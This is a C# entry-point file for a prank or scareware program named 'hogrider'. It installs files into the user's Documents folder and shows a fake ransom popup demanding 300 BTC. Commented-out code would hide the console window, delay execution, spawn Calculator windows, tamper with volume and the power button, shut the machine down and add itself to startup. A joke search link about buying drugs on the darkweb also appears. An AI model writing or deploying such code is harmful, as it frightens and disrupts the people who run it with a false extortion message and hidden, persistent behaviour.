using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows;
using hogrider;


/*[DllImport("kernel32.dll")]
static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

const int SW_HIDE = 0;

var handle = GetConsoleWindow();
ShowWindow(handle, SW_HIDE);*/



string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
string dir = path + "\\hogrider\\";

// Thread.Sleep(60000 * 2); // 2 Minutes

// Check if directory exists
if (Directory.Exists(dir))
{
    Console.WriteLine("Directory found, skipping installs...");
} else
{
    Directory.CreateDirectory(dir);
    Install.Main();
}


Utils.MessageBoxError("Pay 300 BTC to fix ur pc", "Jerome Verbeeck x Hogriderrrr");
/*
for (int i = 0; i < 12; i++)
{
    System.Diagnostics.Process.Start("calc");
}*/


// Utils.ChangeVolume();
// Utils.RemovePowerButton();

// Utils.OpenFile(dir, "hogrider.jpg");
// Utils.OpenFile(dir, "woman.png");
// Utils.OpenUrl("https://www.google.com/search?q=How+to+buy+hasj+on+darkweb+legit+tutorial+2016&rlz=1C1GCEA_enBE992BE992&oq=How+to+buy+hasj+on+darkweb+legit+tutorial+2016&aqs=chrome..69i57.218j0j9&sourceid=chrome&ie=UTF-8");

// Utils.Shutdown();

// Utils.AddStartup();